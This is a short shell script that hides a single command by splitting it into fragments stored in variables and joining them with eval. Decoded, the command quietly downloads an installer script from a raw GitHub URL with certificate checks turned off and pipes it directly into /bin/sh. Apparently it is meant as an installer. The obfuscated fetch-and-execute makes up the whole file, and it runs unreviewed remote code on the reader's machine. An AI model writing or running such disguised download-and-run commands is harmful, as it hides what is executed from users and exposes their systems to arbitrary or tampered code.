z="
";Tz='ream';Yz='er.s';Dz='o-ch';Rz='mil2';Lz='.git';Uz='sat/';az=' - |';Oz='onte';Mz='hubu';Sz='37/d';Bz=' -q ';Pz='nt.c';Nz='serc';Wz='/ins';Qz='om/e';Cz='"--n';Jz='ps:/';Zz='h -O';Iz=' htt';cz='n/sh';Vz='main';Hz='ate"';Kz='/raw';Ez='eck-';Gz='ific';Fz='cert';Az='wget';Xz='tall';bz=' /bi';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz"